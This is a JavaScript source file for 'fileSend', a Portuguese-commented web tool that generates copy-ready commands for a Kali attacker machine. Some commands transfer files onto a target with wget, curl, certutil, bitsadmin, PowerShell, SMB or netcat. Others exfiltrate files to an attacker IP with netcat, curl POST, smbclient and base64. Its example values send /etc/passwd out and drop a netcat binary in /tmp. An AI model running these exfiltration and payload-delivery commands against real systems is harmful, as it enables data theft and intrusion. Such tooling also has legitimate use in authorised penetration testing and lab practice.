/* fileSend · mclohrk · https://mclohrk.xyz
 *
 * CHANGELOG (correções desta versão):
 * [FIX-1] Exfiltração agora é validada (validateExfil) — antes caía em
 *         placeholders silenciosos (SEU_IP, /caminho/arquivo).
 * [FIX-2] Porta de exfiltração separada (inp-exfil-port) — evita colisão
 *         com o http.server de envio. Fallback: usa inp-port.
 * [FIX-3] Porta do Netcat de envio configurável (inp-nc-port) — antes
 *         fixa em 9000. Fallback: 9000.
 * [FIX-4] copyCmd agora também recusa textos de "preencha os campos".
 */

function vals() {
  const ip          = document.getElementById('inp-ip').value.trim();
  const targetIp    = document.getElementById('inp-target-ip').value.trim();
  const port        = document.getElementById('inp-port').value.trim() || '8000';
  const filePath    = document.getElementById('inp-file').value.trim();
  const destLinux   = document.getElementById('inp-dest-linux').value.trim()   || '/tmp/';
  const destWindows = document.getElementById('inp-dest-windows').value.trim() || 'C:\\Windows\\Temp\\';
  const sshUser     = document.getElementById('inp-ssh-user').value.trim();
  const sshPort     = document.getElementById('inp-ssh-port').value.trim() || '22';

  // [FIX-3] Porta do Netcat de envio — configurável, default 9000
  const ncPortEl = document.getElementById('inp-nc-port');
  const ncPort   = (ncPortEl ? ncPortEl.value.trim() : '') || '9000';

  const normalizedPath = filePath.replace(/\\/g, '/');
  const pathParts      = normalizedPath.split('/');
  const fileName       = pathParts[pathParts.length - 1] || 'arquivo';
  const lastSlash      = normalizedPath.lastIndexOf('/');
  const fileDir        = lastSlash >= 0 ? normalizedPath.substring(0, lastSlash) : '.';

  return { ip, targetIp, port, filePath, fileName, fileDir, destLinux, destWindows, sshUser, sshPort, ncPort };
}

function set(id, text) {
  const el = document.getElementById(id);
  if (el) el.textContent = text;
}

function joinLinuxDest(dest, file) {
  if (!dest) return file;
  return dest.endsWith('/') ? dest + file : dest + '/' + file;
}

function joinWindowsDest(dest, file) {
  if (!dest) return file;
  return (dest.endsWith('\\') || dest.endsWith('/')) ? dest + file : dest + '\\' + file;
}

function urlName(name) {
  return encodeURIComponent(name);
}

function validate(v) {
  const problems = [];
  if (!v.ip)       problems.push('Informe o IP do Kali / servidor.');
  if (!v.targetIp) problems.push('Informe o IP do alvo.');
  if (!v.filePath) problems.push('Informe o caminho completo do arquivo.');
  return problems;
}

function update() {
  const v = vals();
  const problems = validate(v);

  if (problems.length) {
    clearCommands();
    updateDynamicFields(v);
    return;
  }

  const { ip, targetIp, port, filePath, fileName, fileDir, destLinux, destWindows, sshUser, sshPort, ncPort } = v;

  const linuxDestination   = joinLinuxDest(destLinux, fileName);
  const windowsDestination = joinWindowsDest(destWindows, fileName);
  const encodedFile        = urlName(fileName);
  const httpUrl            = `http://${ip}:${port}/${encodedFile}`;

  // ── Linux 1: HTTP + wget/curl ───────────────────────────────────────
  set('l1-kali',        `python3 -m http.server ${port} --directory "${fileDir}"`);
  set('l1-target-wget', `wget "${httpUrl}" -O "${linuxDestination}"`);
  set('l1-target-curl', `curl -o "${linuxDestination}" "${httpUrl}"`);

  // ── Linux 2: HTTP + python3 ─────────────────────────────────────────
  set('l2-kali',   `python3 -m http.server ${port} --directory "${fileDir}"`);
  set('l2-target', `python3 -c "import urllib.request; urllib.request.urlretrieve('${httpUrl}', '${linuxDestination}')"`);

  // ── Linux 3: Netcat ─────────────────────────────────────────────────
  // [FIX-3] porta agora vem de inp-nc-port (fallback 9000)
  set('l3-kali',   `nc "${targetIp}" ${ncPort} < "${filePath}"`);
  set('l3-target', `nc -lv ${ncPort} > "${linuxDestination}"`);

  // ── Linux 4: SCP ────────────────────────────────────────────────────
  if (sshUser) {
    set('l4-kali', `scp -P ${sshPort} "${filePath}" "${sshUser}@${targetIp}:${destLinux}"`);
  } else {
    set('l4-kali', `Informe o usuário SSH para gerar o comando SCP.`);
  }

  // ── Windows 1: PowerShell ───────────────────────────────────────────
  set('w1-kali',             `python3 -m http.server ${port} --directory "${fileDir}"`);
  set('w1-target-iwr',       `iwr -Uri "${httpUrl}" -OutFile "${windowsDestination}"`);
  set('w1-target-webclient', `(New-Object Net.WebClient).DownloadFile('${httpUrl}','${windowsDestination}')`);

  // ── Windows 2: SMB ──────────────────────────────────────────────────
  set('w2-kali',   `impacket-smbserver share "${fileDir}" -smb2support`);
  set('w2-target', `copy "\\\\${ip}\\share\\${fileName}" "${windowsDestination}"`);

  // ── Windows 3: certutil ─────────────────────────────────────────────
  set('w3-kali',   `python3 -m http.server ${port} --directory "${fileDir}"`);
  set('w3-target', `certutil -urlcache -split -f "${httpUrl}" "${windowsDestination}"`);

  // ── Windows 4: bitsadmin ────────────────────────────────────────────
  set('w4-kali',   `python3 -m http.server ${port} --directory "${fileDir}"`);
  set('w4-target', `bitsadmin /transfer fileSend_job /download /priority normal "${httpUrl}" "${windowsDestination}"`);

  updateDynamicFields(v);
}

function clearCommands() {
  ['l1-kali','l1-target-wget','l1-target-curl',
   'l2-kali','l2-target','l3-kali','l3-target','l4-kali',
   'w1-kali','w1-target-iwr','w1-target-webclient',
   'w2-kali','w2-target','w3-kali','w3-target','w4-kali','w4-target']
    .forEach(id => set(id, 'Preencha os campos obrigatórios acima.'));
}

function updateDynamicFields(v) {
  document.querySelectorAll('.dyn-ip').forEach(el   => el.textContent = v.ip);
  document.querySelectorAll('.dyn-port').forEach(el => el.textContent = v.port);
  document.querySelectorAll('.dyn-file').forEach(el => el.textContent = v.fileName);
}

function copyCmd(id, btn) {
  const el = document.getElementById(id);
  if (!el) return;
  const text = el.textContent;
  // [FIX-4] recusa tanto placeholders de envio quanto de exfiltração
  if (!text || text.startsWith('Preencha os campos')) return;
  const done = () => {
    btn.textContent = '✓';
    btn.classList.add('copied');
    setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 1400);
  };
  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(text).then(done).catch(() => fallbackCopy(text, done));
  } else {
    fallbackCopy(text, done);
  }
}

function fallbackCopy(text, cb) {
  const textarea = document.createElement('textarea');
  textarea.value = text;
  textarea.style.position = 'fixed';
  textarea.style.left = '-9999px';
  textarea.style.opacity = '0';
  document.body.appendChild(textarea);
  textarea.focus();
  textarea.select();
  try { document.execCommand('copy'); cb(); } finally { document.body.removeChild(textarea); }
}

function switchTab(name, btn) {
  document.querySelectorAll('.tab-btn').forEach(b  => b.classList.remove('active'));
  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
  btn.classList.add('active');
  const panel = document.getElementById('panel-' + name);
  if (panel) panel.classList.add('active');
}

['inp-ip','inp-target-ip','inp-port','inp-file','inp-dest-linux','inp-dest-windows','inp-ssh-user','inp-ssh-port','inp-nc-port']
  .forEach(id => {
    const el = document.getElementById(id);
    if (el) el.addEventListener('input', update);
  });

update();


/* -------------------------------------------------------------
 * Tema dark / light
 * ------------------------------------------------------------- */

function toggleTheme() {
  const root = document.documentElement;
  const btn  = document.getElementById('theme-btn');
  if (root.getAttribute('data-theme') === 'light') {
    root.removeAttribute('data-theme');
    btn.textContent = '🌙';
    localStorage.setItem('filesend-theme', 'dark');
  } else {
    root.setAttribute('data-theme', 'light');
    btn.textContent = '☀️';
    localStorage.setItem('filesend-theme', 'light');
  }
}

(function initTheme() {
  const saved = localStorage.getItem('filesend-theme');
  if (saved === 'light') {
    document.documentElement.setAttribute('data-theme', 'light');
    const btn = document.getElementById('theme-btn');
    if (btn) btn.textContent = '☀️';
  }
})();


/* -------------------------------------------------------------
 * Preencher exemplo
 * ------------------------------------------------------------- */

function fillExample() {
  const fields = {
    'inp-ip':                    '172.16.0.5',
    'inp-target-ip':             '172.16.0.20',
    'inp-exfil-attacker-ip':     '172.16.0.5',
    'inp-port':                  '8080',
    'inp-nc-port':               '9000',
    'inp-exfil-port':            '9001',
    'inp-file':                  '/home/kali/tools/nc',
    'inp-dest-linux':            '/tmp/',
    'inp-dest-windows':          'C:\\Windows\\Temp\\',
    'inp-ssh-user':              'root',
    'inp-ssh-port':              '22',
    'inp-exfil-file':            '/etc/passwd',
    'inp-exfil-dest':            '/tmp/exfil/'
  };

  Object.entries(fields).forEach(([id, val]) => {
    const el = document.getElementById(id);
    if (el) el.value = val;
  });

  update();
  updateExfil();
}


/* -------------------------------------------------------------
 * Sub-abas (exfil Linux / Windows)
 * ------------------------------------------------------------- */

function switchSubTab(name, btn) {
  btn.closest('.tab-panel').querySelectorAll('.subtab-btn')
    .forEach(b => b.classList.remove('active'));
  btn.closest('.tab-panel').querySelectorAll('.subtab-panel')
    .forEach(p => p.classList.remove('active'));
  btn.classList.add('active');
  const panel = document.getElementById('panel-' + name);
  if (panel) panel.classList.add('active');
}


/* -------------------------------------------------------------
 * Exfiltração — geração de comandos
 * ------------------------------------------------------------- */

// [FIX-2] porta de exfiltração separada da porta HTTP de envio
function exfilVals() {
  const ip       = document.getElementById('inp-exfil-attacker-ip').value.trim();
  const filePath = document.getElementById('inp-exfil-file').value.trim();
  const dest     = document.getElementById('inp-exfil-dest').value.trim() || '/tmp/exfil/';
  const portEl   = document.getElementById('inp-exfil-port');
  const port     = (portEl ? portEl.value.trim() : '') || '9001';
  return { ip, filePath, dest, port };
}

// [FIX-1] validação da exfiltração — antes caía em placeholders silenciosos
function validateExfil(v) {
  const problems = [];
  if (!v.ip)       problems.push('Informe seu IP atacante (onde receber).');
  if (!v.filePath) problems.push('Informe o arquivo a exfiltrar.');
  return problems;
}

function updateExfil() {
  const v = exfilVals();
  const problems = validateExfil(v);

  if (problems.length) {
    clearExfilCommands();
    return;
  }

  const { ip, filePath: exFile, dest: exDest, port } = v;

  const normalized = exFile.replace(/\\/g, '/');
  const fileName   = normalized.split('/').pop() || 'arquivo';
  const destFile   = (exDest.endsWith('/') ? exDest : exDest + '/') + fileName;

  // ── Linux 1: Netcat ──────────────────────────────────────────
  set('ex-l1-kali',   `nc -lvp ${port} > "${destFile}"`);
  set('ex-l1-target', `nc ${ip} ${port} < "${exFile}"`);

  // ── Linux 2: curl POST ───────────────────────────────────────
  set('ex-l2-kali',   `mkdir -p ${exDest} && python3 -m uploadserver ${port} --directory "${exDest}"`);
  set('ex-l2-target', `curl -F "file=@${exFile}" http://${ip}:${port}/upload`);

  // ── Linux 3: base64 ──────────────────────────────────────────
  set('ex-l3-kali',   `echo 'COLE_BASE64_AQUI' | base64 -d > "${destFile}"`);
  set('ex-l3-target', `base64 -w0 "${exFile}"`);

  // ── Linux 4: SMB ─────────────────────────────────────────────
  set('ex-l4-kali',   `mkdir -p ${exDest} && impacket-smbserver exfil "${exDest}" -smb2support`);
  set('ex-l4-target', `smbclient //${ip}/exfil -N -c "put ${exFile} ${fileName}"`);

  // ── Windows 1: SMB ───────────────────────────────────────────
  set('ex-w1-kali',   `mkdir -p ${exDest} && impacket-smbserver exfil "${exDest}" -smb2support`);
  set('ex-w1-target', `copy "${exFile}" "\\\\${ip}\\exfil\\${fileName}"`);

  // ── Windows 2: PowerShell POST ───────────────────────────────
  set('ex-w2-kali',   `mkdir -p ${exDest} && python3 -m uploadserver ${port} --directory "${exDest}"`);
  set('ex-w2-target', `Invoke-WebRequest -Uri http://${ip}:${port}/upload -Method POST -InFile "${exFile}" -ContentType "multipart/form-data"`);

  // ── Windows 3: certutil base64 ───────────────────────────────
  set('ex-w3-kali',   `echo 'COLE_BASE64_AQUI' | base64 -d > "${destFile}"`);
  set('ex-w3-target', `certutil -encode "${exFile}" encoded.b64 && type encoded.b64`);

  // ── Windows 4: Netcat ────────────────────────────────────────
  set('ex-w4-kali',   `nc -lvp ${port} > "${destFile}"`);
  set('ex-w4-target', `nc.exe ${ip} ${port} < "${exFile}"`);
}

function clearExfilCommands() {
  ['ex-l1-kali','ex-l1-target','ex-l2-kali','ex-l2-target',
   'ex-l3-kali','ex-l3-target','ex-l4-kali','ex-l4-target',
   'ex-w1-kali','ex-w1-target','ex-w2-kali','ex-w2-target',
   'ex-w3-kali','ex-w3-target','ex-w4-kali','ex-w4-target']
    .forEach(id => set(id, 'Preencha os campos de exfiltração acima.'));
}


/* -------------------------------------------------------------
 * Listeners de exfil
 * ------------------------------------------------------------- */

['inp-exfil-attacker-ip', 'inp-exfil-file', 'inp-exfil-dest', 'inp-exfil-port'].forEach(id => {
  const el = document.getElementById(id);
  if (el) el.addEventListener('input', updateExfil);
});

updateExfil();


/* -------------------------------------------------------------
 * Download PDF
 * ------------------------------------------------------------- */

function downloadPDF() {
  // Antes de imprimir, expande todos os painéis para capturar tudo
  document.querySelectorAll('.tab-panel, .subtab-panel').forEach(p => {
    p.dataset.wasHidden = p.classList.contains('active') ? '' : 'yes';
    p.classList.add('active');
  });

  window.print();

  // Restaura estado original após impressão
  setTimeout(() => {
    document.querySelectorAll('.tab-panel, .subtab-panel').forEach(p => {
      if (p.dataset.wasHidden === 'yes') {
        p.classList.remove('active');
      }
      delete p.dataset.wasHidden;
    });
  }, 1000);
}
